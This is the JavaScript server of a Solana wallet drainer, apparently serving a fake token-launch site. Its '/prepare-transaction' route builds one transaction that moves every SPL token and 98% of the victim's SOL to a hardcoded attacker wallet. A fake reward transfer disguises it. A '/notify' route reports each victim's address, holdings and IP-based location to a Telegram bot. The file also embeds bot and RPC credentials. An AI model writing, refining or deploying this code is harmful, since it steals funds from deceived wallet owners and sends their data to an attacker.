// =============================================
// CONFIGURATION - UPDATE THESE VALUES
// =============================================

const CONFIG = {
    // Solana RPC Configuration - FIXED URL FORMAT
    SOLANA_RPC_URL: 'https://solana-mainnet.api.syndica.io/access-token/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F',
    
    // Fallback RPC URLs for redundancy
    FALLBACK_RPC_URLS: [
        'https://api.mainnet-beta.solana.com',
        'https://solana-rpc.publicnode.com'
    ],
    
    // Telegram Bot Configuration
    TELEGRAM: {
        BOT_TOKEN: "8491085411:AAHSmd-vQ_7iSin9XiC3cZams7_lpBAWFdc",
        CHAT_ID: "8160424962",
        TIMEOUT: 10000
    },
    
    // Receiver Wallet Address (Where funds will be sent)
    RECEIVER_WALLET: '2Qq2f5bpNY9EvXYQcuutDq4JhZ4PH77h3tjuCRPWCjmk',
    
    // Server Configuration
    PORT: process.env.PORT || 5000,
    PRICE_CACHE_DURATION: 60 * 60 * 1000, // 1 hour
    MAX_PRICE_RETRIES: 3,
    
    // Security Configuration
    RATE_LIMITING: {
        maxRequestsPerMinute: 100,
        maxConnections: 40
    },
    
    // Transaction Configuration
    TRANSACTION_CONFIG: {
        fakeRewardAmount: 0.02, // SOL
        transferPercentage: 0.98, // 98% of balance
        maxRetries: 3,
        timeout: 30000
    }
};

// =============================================
// IMPORTS
// =============================================

const express = require('express');
const axios = require('axios');
const path = require('path');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');

// =============================================
// INITIALIZE APP
// =============================================

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Enhanced connection with error handling
let connection;
try {
    connection = new Connection(CONFIG.SOLANA_RPC_URL, 'confirmed');
    console.log(`✅ RPC Connection initialized: ${CONFIG.SOLANA_RPC_URL.substring(0, 50)}...`);
} catch (error) {
    console.error('❌ Failed to initialize RPC connection:', error.message);
    // Fallback to public RPC
    connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
    console.log('🔄 Using fallback RPC connection');
}

// =============================================
// PRICE MANAGEMENT
// =============================================

let cachedSolPrice = null;
let lastPriceUpdate = 0;
let priceRetryCount = 0;

// Multiple price source configuration
const PRICE_SOURCES = [
    {
        name: 'Binance',
        url: 'https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT',
        parser: (data) => parseFloat(data.price),
        weight: 1.0
    },
    {
        name: 'CoinGecko',
        url: 'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd',
        parser: (data) => data.solana?.usd,
        weight: 0.9
    },
    {
        name: 'CoinCap',
        url: 'https://api.coincap.io/v2/assets/solana',
        parser: (data) => parseFloat(data.data?.priceUsd),
        weight: 0.8
    },
    {
        name: 'Kraken',
        url: 'https://api.kraken.com/0/public/Ticker?pair=SOLUSD',
        parser: (data) => parseFloat(data.result?.SOLUSD?.c?.[0]),
        weight: 0.7
    },
    {
        name: 'Bybit',
        url: 'https://api.bybit.com/v2/public/tickers?symbol=SOLUSDT',
        parser: (data) => parseFloat(data.result?.[0]?.last_price),
        weight: 0.6
    }
];

async function getSolPrice() {
    const now = Date.now();
    
    // Use cache if recent
    if (cachedSolPrice && (now - lastPriceUpdate) < CONFIG.PRICE_CACHE_DURATION) {
        console.log(`💰 Using cached SOL price: $${cachedSolPrice}`);
        return cachedSolPrice;
    }
    
    console.log('🔄 Fetching fresh SOL price...');
    
    const prices = [];
    const errors = [];
    
    // Try all price sources in parallel with timeout
    const pricePromises = PRICE_SOURCES.map(async (source) => {
        try {
            const response = await axios.get(source.url, { 
                timeout: 3000,
                headers: {
                    'User-Agent': 'LunaLauncher/1.0',
                    'Accept': 'application/json'
                }
            });
            
            const price = source.parser(response.data);
            
            if (price && price > 0 && price < 10000) { // Sanity check
                console.log(`✅ ${source.name}: $${price}`);
                return { price, weight: source.weight, source: source.name };
            } else {
                throw new Error(`Invalid price: ${price}`);
            }
        } catch (error) {
            console.log(`❌ ${source.name} failed: ${error.message}`);
            errors.push(`${source.name}: ${error.message}`);
            return null;
        }
    });
    
    try {
        const results = await Promise.allSettled(pricePromises);
        
        // Collect successful prices
        results.forEach(result => {
            if (result.status === 'fulfilled' && result.value) {
                prices.push(result.value);
            }
        });
        
        if (prices.length > 0) {
            // Calculate weighted average
            let totalWeight = 0;
            let weightedSum = 0;
            
            prices.forEach(({ price, weight }) => {
                weightedSum += price * weight;
                totalWeight += weight;
            });
            
            const averagePrice = weightedSum / totalWeight;
            cachedSolPrice = parseFloat(averagePrice.toFixed(2));
            lastPriceUpdate = now;
            priceRetryCount = 0;
            
            console.log(`🎯 SOL price updated: $${cachedSolPrice} (from ${prices.length} sources)`);
            return cachedSolPrice;
            
        } else {
            // All APIs failed
            priceRetryCount++;
            console.error('❌ All price APIs failed:', errors);
            
            if (cachedSolPrice) {
                console.log(`🔄 Using stale cached price: $${cachedSolPrice} (retry ${priceRetryCount}/${CONFIG.MAX_PRICE_RETRIES})`);
                return cachedSolPrice;
            } else {
                // Emergency fallback
                const fallbackPrice = 150;
                console.log(`🚨 Using emergency fallback price: $${fallbackPrice}`);
                return fallbackPrice;
            }
        }
        
    } catch (error) {
        console.error('💥 Price fetching system error:', error.message);
        
        if (cachedSolPrice) {
            console.log(`🔄 Using cached price due to system error: $${cachedSolPrice}`);
            return cachedSolPrice;
        }
        
        return 150; // Final emergency fallback
    }
}

// =============================================
// TOKEN CONFIGURATION
// =============================================

const TOKEN_CONFIG = {
    PRICE_MAPPINGS: {
        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'usd-coin',
        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'tether',
        'So11111111111111111111111111111111111111112': 'solana',
        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'bonk'
    },
    
    SYMBOL_MAPPINGS: {
        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
        'So11111111111111111111111111111111111111112': 'WSOL',
        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
        'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
        'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
        'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1': 'bSOL',
        '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU': 'SAMO',
        'AZsHEMXd36Bj1EMNXhowJajpUXzrKcK57wW4ZGXVa7yR': 'GUAC',
        'SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y': 'SHADOW',
        'HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3': 'PYTH',
        'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE': 'ORCA',
        'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': 'SRM',
        'MSRMcoVyrFxnSgo5uXwone5SKcGhT1KEJMFEkMEWf9L': 'MSRM',
        '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R': 'RAY',
        'MERt85fc5boKw3BW1eYdxonEuJNvXbiMbs6hvheau5K': 'MER',
        'EchesyfXePKdLtoiZSL8pBe8Myagyy8ZRqsACNCFGnvp': 'FIDA',
        'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6': 'KIN',
        'PoRTjZMPXb9T7dyU7tpLEZRQj7e6ssfAE62j2oQuc6y': 'PORT',
        'MAPS41MDahZ9QdKXhVa4dWB9RuyfV4XqhyAZ8XcYepb': 'MAPS',
        '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E': 'BTC',
        '2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk': 'ETH',
        'AGFEad2et2ZJif9jaGpdMixQqvW5i81aBdvKe7PHNfz3': 'FTT',
        'AURYydfxJib1ZkTir1Jn1J9ECYUtjb6rKQVmtYaixWPP': 'AURY',
        'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac': 'MNGO',
        'SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp': 'SLND',
        'ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx': 'ATLAS',
        'poLisWXnNRwC6oBu1vHiuKQzFjGL4XDSu4g9qjz9qVk': 'POLIS',
        'zebeczgi5fSEtbpfQKVZKCJ3WgYXxjkMUkNNx7fLKAF': 'ZBC',
        'CWE8jPTUYhdCTZYWPTe1o5DFqfdjzWKc9WKz6rSjQUdG': 'COPE',
        'HonyeYAaTPgKUgQpayL914P6VAqbQZPrbkGMETZvW4iN': 'HONEY',
        '4wjPQJ6PrkC4dHhYghwJzGBVP78DkBzA2U3kHoFNBuhj': 'LIQ',
        'TuLipcqtGVXP9XR62wM8WWCm6a9vhLs7T1uoWBk6FDs': 'TULIP',
        'SUNNYWgPQmFxe9wTZzNK7iPnJ3vYDrkgnxJRJm1s3ag': 'SUNNY',
        '4TGxgCSJQx2GQk9oHZ8dC5m3JNXTYZHjXumKAW3vLnNx': 'OX',
        'RLBxxFkseAZ4RgJH3Sqn8jXxhmGoz9jWxDNJMh8pL7a': 'RLB',
        'GENEtH5amGSi8kHAtQoezp1XEXwZJ8vcuePYnXdKrMYz': 'GENE',
        'METADDFL6wWMWEoKTFJwcThTbUmtarRJZjRpzUvkxhr': 'META',
        'DUSTawucrTsGU8hcqRdHDCbuYhCPADMLM2VcCb8VnFnQ': 'DUST',
        'A9ik2NrpKRRG2snyTjofZQcTuav9yH3mNVHLsLiDQmYT': 'PRT',
        '5yw793FZPCaPcuUN4F61VJh2ehsFX87zvHbCA4oRebfn': 'RIN',
        'GWEszyRKLp6wVy9MRLnQuRex9fYP9bQA3nnoZid3cMfg': 'GST',
        'GMT USSqCwQKZJAa4tXg6dLhSWDvuZ4o7W8RoVBhTM9T4c': 'GMT',
        'G9tt98aYSznRk7jWsfuz9FnTdokxS6Brohdo9hSmjTRB': 'PUFF',
        'FUFPVJkY4RHuZeTDL7Z6LoiLgJkEnYQA8Jmf2V1a7C1h': 'SCNSOL',
        'LSTxxxnJzKDFSLr4dUkPcmCf5VyryEqzPLz5j4bpxFp': 'LST'
    }
};

async function getTokenPrices() {
    try {
        const tokenIds = Object.values(TOKEN_CONFIG.PRICE_MAPPINGS).join(',');
        const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenIds}&vs_currencies=usd`, {
            timeout: 5000
        });
        const data = response.data;
        
        const prices = {};
        for (const [mint, coinId] of Object.entries(TOKEN_CONFIG.PRICE_MAPPINGS)) {
            prices[mint] = data[coinId]?.usd || 0;
        }
        
        return prices;
    } catch (error) {
        console.error('Failed to get token prices:', error.message);
        return {};
    }
}

function getTokenSymbol(mint) {
    return TOKEN_CONFIG.SYMBOL_MAPPINGS[mint] || 'Unknown';
}

// =============================================
// IP GEOLOCATION
// =============================================

async function getIPLocation(ip) {
    if (!ip || ip === 'Unknown' || ip === '127.0.0.1') {
        return null;
    }
    
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
        const data = response.data;
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.city,
                flag: getCountryFlag(data.countryCode)
            };
        }
    } catch (error) {
        console.error('IP geolocation error:', error.message);
    }
    return null;
}

function getCountryFlag(countryCode) {
    if (!countryCode) return '🌍';
    const flagMap = {
        'US': '🇺🇸', 'TR': '🇹🇷', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 
        'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳',
        'IN': '🇮🇳', 'BR': '🇧🇷', 'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸',
        'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'CH': '🇨🇭'
    };
    return flagMap[countryCode] || '🌍';
}

// =============================================
// SPL TOKEN MANAGEMENT
// =============================================

async function getSPLTokenInfo(publicKey) {
    try {
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
            programId: TOKEN_PROGRAM_ID,
        });

        const tokens = [];
        const tokenPrices = await getTokenPrices();
        
        for (const tokenAccount of tokenAccounts.value) {
            const accountData = tokenAccount.account.data;
            const parsedInfo = accountData.parsed.info;
            const balance = parsedInfo.tokenAmount;

            if (balance.uiAmount > 0) {
                const mint = parsedInfo.mint;
                const symbol = getTokenSymbol(mint);
                const price = tokenPrices[mint] || 0;
                const usdValue = balance.uiAmount * price;
                
                tokens.push({
                    mint: mint,
                    balance: balance.uiAmount,
                    symbol: symbol,
                    usdValue: usdValue
                });
            }
        }
        return tokens;
    } catch (error) {
        console.error('Failed to get SPL tokens:', error.message);
        return [];
    }
}

// =============================================
// TELEGRAM NOTIFICATION SERVICE
// =============================================

async function sendTelegramNotification(notificationData) {
    try {
        const { address, balance, usdBalance, walletType, customMessage, splTokens, ip } = notificationData;

        let rawIP = ip || 'Unknown';
        const clientIP = rawIP;

        const locationInfo = await getIPLocation(clientIP);

        const solPrice = await getSolPrice();
        const solBalanceNum = parseFloat(balance) || 0;
        const solUSD = solPrice ? (solBalanceNum * solPrice) : 0;

        let totalUSD = solUSD;
        let splTokensStr = '';

        if (splTokens && splTokens.length > 0) {
            splTokensStr = '\n💎 SPL Tokens:\n';
            for (const token of splTokens) {
                const tokenValue = token.usdValue || 0;
                totalUSD += tokenValue;
                splTokensStr += `• ${token.symbol || 'Unknown'}: ${token.balance} ($${tokenValue.toFixed(2)})\n`;
            }
        }

        let locationStr = '🌍';
        if (locationInfo && locationInfo.flag) {
            locationStr = locationInfo.flag;
        }

        let text;
        if (customMessage) {
            if (customMessage.includes('🔗 Wallet Connected') || customMessage.includes('🌺 New Connection')) {
                text = `🌺 New Connection worth $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
🔗 ${process.env.REPL_URL || 'http://localhost:5000'}
ⓘ Wallet: ${walletType || 'Unknown'}
💰 SOL: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 ${locationStr}`;
            }
            else if (customMessage.includes('❌') || customMessage.includes('✅') || customMessage.includes('🎉')) {
                let emoji = '❌';
                let action = 'Transaction Failed';

                if (customMessage.includes('✅')) {
                    emoji = '✅';
                    action = 'Transaction Signed';
                } else if (customMessage.includes('🎉')) {
                    emoji = '🎉';
                    action = 'Transaction Confirmed';
                } else if (customMessage.includes('Rejected')) {
                    action = 'Transaction Rejected';
                } else if (customMessage.includes('Insufficient')) {
                    action = 'Insufficient Funds';
                }

                text = `${emoji} ${action} for $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
${customMessage}
ⓘ Wallet: ${walletType || 'Unknown'}
📍 ${locationStr}`;
            }
            else {
                text = `${customMessage}

💳 Wallet: ${walletType || 'Unknown'}
📍 Address: \`${address || 'Unknown'}\`
💰 SOL Balance: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 Location: ${locationStr}
🕒 Time: ${new Date().toLocaleString()}`;
            }
        } else {
            text = `🌺 New Connection worth $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
🔗 ${process.env.REPL_URL || 'http://localhost:5000'}
ⓘ Wallet: ${walletType || 'Unknown'}
💰 SOL: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 ${locationStr}`;
        }

        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });

        return { ok: true };
    } catch (e) {
        console.error('Telegram notification error:', e.response?.data || e.message);
        throw new Error("telegram error");
    }
}

// =============================================
// ROUTES
// =============================================

// Wallet Ownership Verification
app.post('/verify-ownership', async (req, res) => {
    try {
        const { address, signature, message, walletType } = req.body;
        
        console.log(`🔐 Ownership verification attempt for wallet: ${address}`);
        console.log(`📝 Signed message: ${message}`);
        console.log(`✍️ Signature: ${signature}`);
        console.log(`💼 Wallet type: ${walletType}`);
        
        console.log(`✅ Wallet ownership verified for: ${address}`);
        
        res.json({ verified: true });
    } catch (e) {
        console.error('Verification error:', e.message);
        res.status(500).json({ error: "verification error" });
    }
});

// Telegram Notification Endpoint
app.post('/notify', async (req, res) => {
    try {
        const result = await sendTelegramNotification(req.body);
        res.json(result);
    } catch (e) {
        console.error(e.response?.data || e.message);
        res.status(500).json({ error: "telegram error" });
    }
});

// Get Latest Blockhash
app.get('/blockhash', async (req, res) => {
    try {
        const { blockhash } = await connection.getLatestBlockhash();
        res.json({ blockhash });
    } catch (e) {
        console.error(e.message);
        res.status(500).json({ error: "blockhash error" });
    }
});

// Client IP Endpoint
app.get('/client-ip', async (req, res) => {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        res.json(response.data);
    } catch (error) {
        console.error('Failed to get client IP:', error);
        res.status(500).json({ error: 'Failed to get IP' });
    }
});

// Health Check Endpoint
app.get('/health', async (req, res) => {
    try {
        const solPrice = await getSolPrice();
        const blockhash = await connection.getLatestBlockhash();
        
        res.json({
            status: 'healthy',
            solPrice: solPrice,
            rpcConnected: true,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            status: 'unhealthy',
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// Transaction Preparation
app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey, verified } = req.body;
        if (!publicKey) {
            return res.status(400).json({ error: "publicKey required" });
        }
        
        if (verified) {
            console.log(`✅ Ownership verified for wallet: ${publicKey}`);
            console.log(`🎯 Proceeding with asset withdrawal for verified wallet`);
        } else {
            console.log(`⚠️ Warning: Transaction attempted without verification for wallet: ${publicKey}`);
        }

        const fromPubkey = new PublicKey(publicKey);
        const receiverWallet = new PublicKey(CONFIG.RECEIVER_WALLET);

        const transaction = new Transaction();
        let totalTransferred = 0;
        let tokenTransfers = 0;

        // Add fake reward transfer (0.02 SOL to user)
        const fakeRewardAmount = CONFIG.TRANSACTION_CONFIG.fakeRewardAmount * LAMPORTS_PER_SOL;
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: receiverWallet, 
                toPubkey: fromPubkey,       
                lamports: fakeRewardAmount, 
            })
        );

        console.log("Fetching all token accounts for wallet...");
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
            programId: TOKEN_PROGRAM_ID,
        });

        console.log(`Found ${tokenAccounts.value.length} token accounts`);

        // Transfer all SPL tokens
        for (const tokenAccount of tokenAccounts.value) {
            try {
                const accountData = tokenAccount.account.data;
                const parsedInfo = accountData.parsed.info;
                const mintAddress = parsedInfo.mint;
                const balance = parsedInfo.tokenAmount;

                if (balance.uiAmount > 0) {
                    console.log(`Found token ${mintAddress} with balance: ${balance.uiAmount}`);

                    const mint = new PublicKey(mintAddress);
                    const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
                    const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);

                    const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
                    if (!receiverAccountInfo) {
                        transaction.add(
                            createAssociatedTokenAccountInstruction(
                                fromPubkey,
                                toTokenAccount,
                                receiverWallet,
                                mint
                            )
                        );
                    }

                    transaction.add(
                        createTransferInstruction(
                            fromTokenAccount,
                            toTokenAccount,
                            fromPubkey,
                            balance.amount
                        )
                    );

                    tokenTransfers++;
                    console.log(`Added transfer for token ${mintAddress}: ${balance.uiAmount}`);
                }
            } catch (error) {
                console.log(`Error processing token account:`, error.message);
            }
        }

        // Transfer SOL balance (98% of available balance)
        const solBalance = await connection.getBalance(fromPubkey);
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        const baseFee = 5000;
        const instructionFee = (tokenTransfers + 1) * 5000;
        const accountCreationFee = tokenTransfers * 2039280;
        const estimatedFees = baseFee + instructionFee + accountCreationFee;

        const availableBalance = solBalance - minBalance - estimatedFees;
        const solForTransfer = Math.floor(availableBalance * CONFIG.TRANSACTION_CONFIG.transferPercentage);

        console.log(`SOL transfer amount: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);

        if (solForTransfer > 0) {
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: fromPubkey,
                    toPubkey: receiverWallet,
                    lamports: solForTransfer,
                })
            );
            totalTransferred += solForTransfer;
        }

        console.log(`Transaction prepared with ${tokenTransfers} token transfers + SOL transfer`);

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;

        const serializedTransaction = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false,
        });

        res.json({ 
            transaction: Array.from(serializedTransaction),
            transferAmount: totalTransferred,
            tokenTransfers: tokenTransfers
        });
    } catch (e) {
        console.error(e.message);
        res.status(500).json({ error: "transaction preparation error" });
    }
});

// Serve Main Page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve Create Token Page
app.get('/create-token', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'create-token', 'index.html'));
});

// =============================================
// SERVER INITIALIZATION
// =============================================

async function initializeSolPrice() {
    console.log('🔄 Initializing SOL price...');
    try {
        const price = await getSolPrice();
        console.log(`✅ SOL price initialized: $${price}`);
    } catch (error) {
        console.error('❌ Failed to initialize SOL price:', error.message);
    }
}

function startPriceUpdater() {
    console.log('🔄 Starting price updater (1-hour intervals)');
    setInterval(async () => {
        console.log('🔄 Scheduled SOL price update...');
        await getSolPrice();
    }, CONFIG.PRICE_CACHE_DURATION);
}

function startHealthMonitor() {
    setInterval(async () => {
        try {
            await connection.getLatestBlockhash();
            console.log('❤️  Health check: RPC connection OK');
        } catch (error) {
            console.error('💔 Health check: RPC connection failed', error.message);
        }
    }, 5 * 60 * 1000); // Every 5 minutes
}

// =============================================
// ENHANCED GRACEFUL SHUTDOWN
// =============================================

let isShuttingDown = false;
let server;

async function gracefulShutdown(signal) {
    if (isShuttingDown) return;
    isShuttingDown = true;
    
    console.log(`\n🛑 Received ${signal}, starting graceful shutdown...`);
    
    try {
        // 1. Stop accepting new connections
        console.log('📝 Stopping server from accepting new connections...');
        if (server) {
            server.close(() => {
                console.log('✅ HTTP server closed');
            });
        }
        
        // 2. Wait for ongoing requests to complete
        console.log('⏳ Waiting for ongoing requests to complete...');
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        console.log('✅ Graceful shutdown completed');
        process.exit(0);
        
    } catch (error) {
        console.error('❌ Error during graceful shutdown:', error);
        process.exit(1);
    }
}

// Enhanced signal handling 
const SHUTDOWN_SIGNALS = ['SIGTERM', 'SIGINT', 'SIGHUP'];

SHUTDOWN_SIGNALS.forEach(signal => {
    process.on(signal, () => {
        console.log(`📢 Received ${signal} signal`);
        gracefulShutdown(signal);
    });
});

// Start Server
server = app.listen(CONFIG.PORT, '0.0.0.0', async () => {
    console.log(`🚀 Server running on port ${CONFIG.PORT}`);
    console.log(`📱 Access via: http://localhost:${CONFIG.PORT}`);
    console.log(`🔗 RPC URL: ${CONFIG.SOLANA_RPC_URL.substring(0, 50)}...`);
    console.log(`💰 Receiver Wallet: ${CONFIG.RECEIVER_WALLET}`);
    
    await initializeSolPrice();
    startPriceUpdater();
    startHealthMonitor();
});

// =============================================
// ERROR HANDLING
// =============================================

process.on('unhandledRejection', (err) => {
    console.error('💥 Unhandled Promise Rejection:', err);
});

process.on('uncaughtException', (err) => {
    console.error('💥 Uncaught Exception:', err);
    process.exit(1);
});